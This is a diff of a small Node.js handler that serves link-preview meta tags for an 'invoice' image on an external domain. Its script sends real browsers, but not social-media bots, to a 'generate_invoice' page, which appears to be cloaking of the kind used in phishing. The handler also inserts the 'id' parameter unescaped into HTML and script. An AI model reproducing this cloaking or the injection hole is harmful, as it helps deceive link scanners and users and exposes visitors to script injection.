@@ -2,11 +2,8 @@ module.exports = (req, res) => {
   const { searchParams } = new URL(req.url, 'http://localhost');
   const invoiceId = searchParams.get('id');
 
-  // 1. Create the final, real image URL from your server.
   const imageUrl = `https://japan-ab.ct.ws/uploads/${invoiceId}.jpg`;
 
-  // 2. Create the HTML code as a simple text string.
-  //    This is the "webpage" that will contain your OG tag.
   const html = `
     <!DOCTYPE html>
     <html>
@@ -24,7 +21,6 @@ module.exports = (req, res) => {
         <meta property="og:image:alt" content="Invoice Preview" />
         
         <script>
-          // Only redirect if it's a real browser (not a bot)
           if (!/bot|facebook|telegram|twitter|linkedin|whatsapp/i.test(navigator.userAgent)) {
             window.location.href = 'https://japan-ab.ct.ws/generate_invoice.html?id='+'${invoiceId}';
           }
@@ -36,7 +32,6 @@ module.exports = (req, res) => {
     </html>
   `;
 
-  // 3. Send the HTML back as the response.
   res.statusCode = 200;
   res.setHeader('Content-Type', 'text/html');
   res.end(html);
